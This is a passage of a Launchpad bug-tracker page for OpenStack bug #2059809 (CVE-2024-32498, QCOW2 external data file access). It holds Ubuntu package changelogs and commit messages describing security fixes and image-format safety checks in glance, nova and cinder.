    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package glance - 2:29.0.<wbr />0~b2+git2024080<wbr />717.695fcb67-<wbr />0ubuntu1~<wbr />cloud0<br />
---------------</p>
<p>&nbsp;glance (2:29.0.<wbr />0~b2+git2024080<wbr />717.695fcb67-<wbr />0ubuntu1~<wbr />cloud0) noble-dalmatian; urgency=medium<br />
&nbsp;.<br />
&nbsp;&nbsp;&nbsp;* New upstream release for the Ubuntu Cloud Archive.<br />
&nbsp;.<br />
&nbsp;glance (2:29.0.<wbr />0~b2+git2024080<wbr />717.695fcb67-<wbr />0ubuntu1) oracular; urgency=medium<br />
&nbsp;.<br />
&nbsp;&nbsp;&nbsp;* New upstream snapshot for OpenStack Dalmatian.<br />
&nbsp;&nbsp;&nbsp;* d/control: Align (Build-)Depends with upstream.<br />
&nbsp;&nbsp;&nbsp;* d/p/CVE*.patch: Drop, included in snapshot.<br />
&nbsp;.<br />
&nbsp;glance (2:28.0.1-0ubuntu3) oracular; urgency=medium<br />
&nbsp;.<br />
&nbsp;&nbsp;&nbsp;* SECURITY UPDATE: Arbitrary file access via custom QCOW2 external data<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/2059809" class="bug-link">#2059809</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-1.<wbr />patch: reject qcow files with<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data-file attributes.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-2.<wbr />patch: extend format_inspector for<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;QCOW safety.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-3.<wbr />patch: add VMDK safety check.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-4.<wbr />patch: reject unsafe qcow and vmdk<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;files.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-5.<wbr />patch: add QED format detection to<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />format_<wbr />inspector.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-6.<wbr />patch: add file format detection to<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />format_<wbr />inspector.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-7.<wbr />patch: add safety check and detection<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;support to FI tool.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2024-32498</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">
This bug was fixed in the package glance - 2:29.0.0~b2+git2024080717.695fcb67-0ubuntu1~cloud0
---------------

 glance (2:29.0.0~b2+git2024080717.695fcb67-0ubuntu1~cloud0) noble-dalmatian; urgency=medium
 .
   * New upstream release for the Ubuntu Cloud Archive.
 .
 glance (2:29.0.0~b2+git2024080717.695fcb67-0ubuntu1) oracular; urgency=medium
 .
   * New upstream snapshot for OpenStack Dalmatian.
   * d/control: Align (Build-)Depends with upstream.
   * d/p/CVE*.patch: Drop, included in snapshot.
 .
 glance (2:28.0.1-0ubuntu3) oracular; urgency=medium
 .
   * SECURITY UPDATE: Arbitrary file access via custom QCOW2 external data
     (LP: #2059809)
     - debian/patches/CVE-2024-32498-1.patch: reject qcow files with
       data-file attributes.
     - debian/patches/CVE-2024-32498-2.patch: extend format_inspector for
       QCOW safety.
     - debian/patches/CVE-2024-32498-3.patch: add VMDK safety check.
     - debian/patches/CVE-2024-32498-4.patch: reject unsafe qcow and vmdk
       files.
     - debian/patches/CVE-2024-32498-5.patch: add QED format detection to
       format_inspector.
     - debian/patches/CVE-2024-32498-6.patch: add file format detection to
       format_inspector.
     - debian/patches/CVE-2024-32498-7.patch: add safety check and detection
       support to FI tool.
     - CVE-2024-32498
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in cloud-archive: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/426" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~james-page" class="sprite person">James Page (james-page)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-21T14:26:52.063196+00:00" title="2024-08-21 14:26:52 UTC">on 2024-08-21</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/426"> #426</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package nova - 3:29.1.<wbr />0+git2024080716<wbr />.bb2d7f9c-<wbr />0ubuntu1~<wbr />cloud0<br />
---------------</p>
<p>&nbsp;nova (3:29.1.<wbr />0+git2024080716<wbr />.bb2d7f9c-<wbr />0ubuntu1~<wbr />cloud0) noble-dalmatian; urgency=medium<br />
&nbsp;.<br />
&nbsp;&nbsp;&nbsp;* New upstream release for the Ubuntu Cloud Archive.<br />
&nbsp;.<br />
&nbsp;nova (3:29.1.<wbr />0+git2024080716<wbr />.bb2d7f9c-<wbr />0ubuntu1) oracular; urgency=medium<br />
&nbsp;.<br />
&nbsp;&nbsp;&nbsp;* New upstream snapshot for OpenStack Dalmatian.<br />
&nbsp;&nbsp;&nbsp;* d/control: Align (Build-)Depends with upstream.<br />
&nbsp;&nbsp;&nbsp;* d/p/test-<wbr />hacking-<wbr />compat.<wbr />patch: Drop, included upstream.<br />
&nbsp;&nbsp;&nbsp;* d/p/oslo.<wbr />versionedobject<wbr />s-compat.<wbr />patch: Drop, similar included<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;upstream.<br />
&nbsp;&nbsp;&nbsp;* d/p/CVE*.patch: Drop, included in snapshot.<br />
&nbsp;.<br />
&nbsp;nova (3:29.0.1-0ubuntu4) oracular; urgency=medium<br />
&nbsp;.<br />
&nbsp;&nbsp;&nbsp;* SECURITY UPDATE: Arbitrary file access via custom QCOW2 external data<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/2059809" class="bug-link">#2059809</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-1.<wbr />patch: reject qcow files with<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data-file attributes.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-2.<wbr />patch: check images with<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />format_<wbr />inspector for safety.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-3.<wbr />patch: additional qemu safety<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checking on base images.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />CVE-2024-<wbr />32498-4.<wbr />patch: fix vmdk_allowed_types<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checking.<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2024-32498</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">
This bug was fixed in the package nova - 3:29.1.0+git2024080716.bb2d7f9c-0ubuntu1~cloud0
---------------

 nova (3:29.1.0+git2024080716.bb2d7f9c-0ubuntu1~cloud0) noble-dalmatian; urgency=medium
 .
   * New upstream release for the Ubuntu Cloud Archive.
 .
 nova (3:29.1.0+git2024080716.bb2d7f9c-0ubuntu1) oracular; urgency=medium
 .
   * New upstream snapshot for OpenStack Dalmatian.
   * d/control: Align (Build-)Depends with upstream.
   * d/p/test-hacking-compat.patch: Drop, included upstream.
   * d/p/oslo.versionedobjects-compat.patch: Drop, similar included
     upstream.
   * d/p/CVE*.patch: Drop, included in snapshot.
 .
 nova (3:29.0.1-0ubuntu4) oracular; urgency=medium
 .
   * SECURITY UPDATE: Arbitrary file access via custom QCOW2 external data
     (LP: #2059809)
     - debian/patches/CVE-2024-32498-1.patch: reject qcow files with
       data-file attributes.
     - debian/patches/CVE-2024-32498-2.patch: check images with
       format_inspector for safety.
     - debian/patches/CVE-2024-32498-3.patch: additional qemu safety
       checking on base images.
     - debian/patches/CVE-2024-32498-4.patch: fix vmdk_allowed_types
       checking.
     - CVE-2024-32498
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/427" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-28T15:48:30.334001+00:00" title="2024-08-28 15:48:30 UTC">on 2024-08-28</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/427">
                <strong>Fix merged to cinder (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/427"> #427</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/cinder/+/923873">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/cinder/<wbr />+/923873</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/cinder/commit/0c3c65376f1aa46b35bedb4b59eac0bf8cc5979e">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />cinder/<wbr />commit/<wbr />0c3c65376f1aa46<wbr />b35bedb4b59eac0<wbr />bf8cc5979e</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/yoga</p>
<p>commit 0c3c65376f1aa46<wbr />b35bedb4b59eac0<wbr />bf8cc5979e<br />
Author: Brian Rosmaita &lt;email address hidden&gt;<br />
Date:   Wed Jun 26 14:09:30 2024 -0400</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;CVE-2024-32498: Check for external qcow2 data file</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Adds code to image_utils to check for a qcow2 external data<br />
&nbsp;&nbsp;&nbsp;&nbsp;file, a recent feature of qemu which we do not support and<br />
&nbsp;&nbsp;&nbsp;&nbsp;which can be used maliciously.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Advice from the qemu-img community is that it is dangerous<br />
&nbsp;&nbsp;&nbsp;&nbsp;to call qemu-img info on untrusted files, so we copy over<br />
&nbsp;&nbsp;&nbsp;&nbsp;the format_inspector module from Glance.  This performs basic<br />
&nbsp;&nbsp;&nbsp;&nbsp;analysis on the image data file so we can detect problematic<br />
&nbsp;&nbsp;&nbsp;&nbsp;images before we call qemu-img info to get all the image<br />
&nbsp;&nbsp;&nbsp;&nbsp;attributes.  It is expected that this code will eventually be<br />
&nbsp;&nbsp;&nbsp;&nbsp;added to oslo so it can be consumed by Glance, Cinder, and<br />
&nbsp;&nbsp;&nbsp;&nbsp;Nova.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Because cinder itself may create qcow2 format images with a<br />
&nbsp;&nbsp;&nbsp;&nbsp;backing file in nfs-based backends, the glance format_inspector<br />
&nbsp;&nbsp;&nbsp;&nbsp;has been modified to optionally allow such files.  Since we are<br />
&nbsp;&nbsp;&nbsp;&nbsp;monkeying with the format_inspector code, we also copy over<br />
&nbsp;&nbsp;&nbsp;&nbsp;its unit tests to prevent regressions and to add tests for the<br />
&nbsp;&nbsp;&nbsp;&nbsp;changed code.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Includes an additional fix to prevent an issue where a user<br />
&nbsp;&nbsp;&nbsp;&nbsp;could mount a raw volume and write a qcow2 header with a larger<br />
&nbsp;&nbsp;&nbsp;&nbsp;virtual size on it. On reattaching the volume it would have the<br />
&nbsp;&nbsp;&nbsp;&nbsp;new larger virtual size avaialable without actually changing<br />
&nbsp;&nbsp;&nbsp;&nbsp;the size value in cinder.  While we cannot prevent this we can<br />
&nbsp;&nbsp;&nbsp;&nbsp;prevent the user from using this volume again, which makes this<br />
&nbsp;&nbsp;&nbsp;&nbsp;exploit pointless.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;unmaintaine<wbr />d/yoga only: The tests<br />
&nbsp;&nbsp;&nbsp;&nbsp;cinder.<wbr />tests.unit.<wbr />volume.<wbr />drivers.<wbr />test_quobyte.<wbr />QuobyteDriverTe<wbr />stCase.<br />
&nbsp;&nbsp;&nbsp;&nbsp;* test_copy_<wbr />volume_<wbr />from_snapshot_<wbr />not_cached_<wbr />overlay<br />
&nbsp;&nbsp;&nbsp;&nbsp;* test_copy_<wbr />volume_<wbr />from_snapshot<br />
&nbsp;&nbsp;&nbsp;&nbsp;* test_copy_<wbr />volume_<wbr />from_snapshot_<wbr />not_cached<br />
&nbsp;&nbsp;&nbsp;&nbsp;failed as convert_image mock was not called, remove this mock<br />
&nbsp;&nbsp;&nbsp;&nbsp;from yoga and on older branches.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;With older qemu installed one of the qemu-img<br />
&nbsp;&nbsp;&nbsp;&nbsp;create commands fails, let&#x27;s skip it from unmaintained/yoga and<br />
&nbsp;&nbsp;&nbsp;&nbsp;below that in test_qcow2_<wbr />safety_<wbr />checks.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Co-authored-by: Dan Smith &lt;email address hidden&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;Co-authored-by: Felix Huettner &lt;email address hidden&gt;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I65857288b797cd<wbr />e573e7443ac6e7e<wbr />6f57fedde01<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 4aa6590a483901d<wbr />e64e0d162fff11f<wbr />3d2d7f9977)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit d6a186945e03649<wbr />343af55b46ed8df<wbr />e0dd326e40)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit db98dc207060da2<wbr />34c32a563c13cac<wbr />1edbd62952)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 9e667b02b2c20b4<wbr />ada18c1a472be15<wbr />2956284d45)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 5f5e86e35428662<wbr />27b7339713148b5<wbr />169d069f21)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/cinder/+/923873
Committed: https://opendev.org/openstack/cinder/commit/0c3c65376f1aa46b35bedb4b59eac0bf8cc5979e
Submitter: "Zuul (22348)"
Branch:    unmaintained/yoga

commit 0c3c65376f1aa46b35bedb4b59eac0bf8cc5979e
Author: Brian Rosmaita &lt;rosmaita.fossdev@gmail.com&gt;
Date:   Wed Jun 26 14:09:30 2024 -0400

    CVE-2024-32498: Check for external qcow2 data file
    
    Adds code to image_utils to check for a qcow2 external data
    file, a recent feature of qemu which we do not support and
    which can be used maliciously.
    
    Advice from the qemu-img community is that it is dangerous
    to call qemu-img info on untrusted files, so we copy over
    the format_inspector module from Glance.  This performs basic
    analysis on the image data file so we can detect problematic
    images before we call qemu-img info to get all the image
    attributes.  It is expected that this code will eventually be
    added to oslo so it can be consumed by Glance, Cinder, and
    Nova.
    
    Because cinder itself may create qcow2 format images with a
    backing file in nfs-based backends, the glance format_inspector
    has been modified to optionally allow such files.  Since we are
    monkeying with the format_inspector code, we also copy over
    its unit tests to prevent regressions and to add tests for the
    changed code.
    
    Includes an additional fix to prevent an issue where a user
    could mount a raw volume and write a qcow2 header with a larger
    virtual size on it. On reattaching the volume it would have the
    new larger virtual size avaialable without actually changing
    the size value in cinder.  While we cannot prevent this we can
    prevent the user from using this volume again, which makes this
    exploit pointless.
    
    unmaintained/yoga only: The tests
    cinder.tests.unit.volume.drivers.test_quobyte.QuobyteDriverTestCase.
    * test_copy_volume_from_snapshot_not_cached_overlay
    * test_copy_volume_from_snapshot
    * test_copy_volume_from_snapshot_not_cached
    failed as convert_image mock was not called, remove this mock
    from yoga and on older branches.
    
    With older qemu installed one of the qemu-img
    create commands fails, let's skip it from unmaintained/yoga and
    below that in test_qcow2_safety_checks.
    
    Co-authored-by: Dan Smith &lt;dansmith@redhat.com&gt;
    Co-authored-by: Felix Huettner &lt;felix.huettner@mail.schwarz&gt;
    
    Change-Id: I65857288b797cde573e7443ac6e7e6f57fedde01
    Closes-bug: #2059809
    (cherry picked from commit 4aa6590a483901de64e0d162fff11f3d2d7f9977)
    (cherry picked from commit d6a186945e03649343af55b46ed8dfe0dd326e40)
    (cherry picked from commit db98dc207060da234c32a563c13cac1edbd62952)
    (cherry picked from commit 9e667b02b2c20b4ada18c1a472be152956284d45)
    (cherry picked from commit 5f5e86e3542866227b7339713148b5169d069f21)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/428" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-28T23:23:41.077900+00:00" title="2024-08-28 23:23:41 UTC">on 2024-08-28</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/428">
                <strong>Related fix merged to glance (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/428"> #428</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/923676">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/923676</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/glance/commit/d8de63a5008b811f2e22cc5cdda59bd2cc05b207">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />glance/<wbr />commit/<wbr />d8de63a5008b811<wbr />f2e22cc5cdda59b<wbr />d2cc05b207</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    master</p>
<p>commit d8de63a5008b811<wbr />f2e22cc5cdda59b<wbr />d2cc05b207<br />
Author: Abhishek Kekane &lt;email address hidden&gt;<br />
Date:   Mon Jul 8 19:28:38 2024 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add iso file format inspector</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change excludes image conversion if source image<br />
&nbsp;&nbsp;&nbsp;&nbsp;format is ISO.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change includes unit tests for the ISO<br />
&nbsp;&nbsp;&nbsp;&nbsp;format inspector using mkisofs to generate<br />
&nbsp;&nbsp;&nbsp;&nbsp;the iso files.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;A test for stashing qcow content in the system_area<br />
&nbsp;&nbsp;&nbsp;&nbsp;of an iso file is also included.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change modifies format_<wbr />inspector.<wbr />detect_<wbr />file_format<br />
&nbsp;&nbsp;&nbsp;&nbsp;to evaluate all inspectors until they are complete and<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise an InvalidDiskInfo exception if multiple formats<br />
&nbsp;&nbsp;&nbsp;&nbsp;match.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Id706480e31687d<wbr />8ade6f7199b600a<wbr />ff3ad7c68f7</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/glance/+/923676
Committed: https://opendev.org/openstack/glance/commit/d8de63a5008b811f2e22cc5cdda59bd2cc05b207
Submitter: "Zuul (22348)"
Branch:    master

commit d8de63a5008b811f2e22cc5cdda59bd2cc05b207
Author: Abhishek Kekane &lt;akekane@redhat.com&gt;
Date:   Mon Jul 8 19:28:38 2024 +0000

    Add iso file format inspector
    
    This change excludes image conversion if source image
    format is ISO.
    
    This change includes unit tests for the ISO
    format inspector using mkisofs to generate
    the iso files.
    
    A test for stashing qcow content in the system_area
    of an iso file is also included.
    
    This change modifies format_inspector.detect_file_format
    to evaluate all inspectors until they are complete and
    raise an InvalidDiskInfo exception if multiple formats
    match.
    
    Related-Bug: #2059809
    Change-Id: Id706480e31687d8ade6f7199b600aff3ad7c68f7
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/429" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-29T04:40:48.462505+00:00" title="2024-08-29 04:40:48 UTC">on 2024-08-29</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/429">
                <strong>Related fix proposed to glance (stable/2024.1)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/429"> #429</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: stable/2024.1<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/927459">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/927459</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: stable/2024.1
Review: https://review.opendev.org/c/openstack/glance/+/927459</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/430" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-29T21:33:51.683078+00:00" title="2024-08-29 21:33:51 UTC">on 2024-08-29</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/430">
                <strong>Related fix merged to glance (stable/2024.1)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/430"> #430</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/927459">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/927459</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/glance/commit/eed2a8aeb7a2e1ba47ff5642a346a97e85b6b0ff">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />glance/<wbr />commit/<wbr />eed2a8aeb7a2e1b<wbr />a47ff5642a346a9<wbr />7e85b6b0ff</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    stable/2024.1</p>
<p>commit eed2a8aeb7a2e1b<wbr />a47ff5642a346a9<wbr />7e85b6b0ff<br />
Author: Abhishek Kekane &lt;email address hidden&gt;<br />
Date:   Mon Jul 8 19:28:38 2024 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add iso file format inspector</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change excludes image conversion if source image<br />
&nbsp;&nbsp;&nbsp;&nbsp;format is ISO.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change includes unit tests for the ISO<br />
&nbsp;&nbsp;&nbsp;&nbsp;format inspector using mkisofs to generate<br />
&nbsp;&nbsp;&nbsp;&nbsp;the iso files.</p>
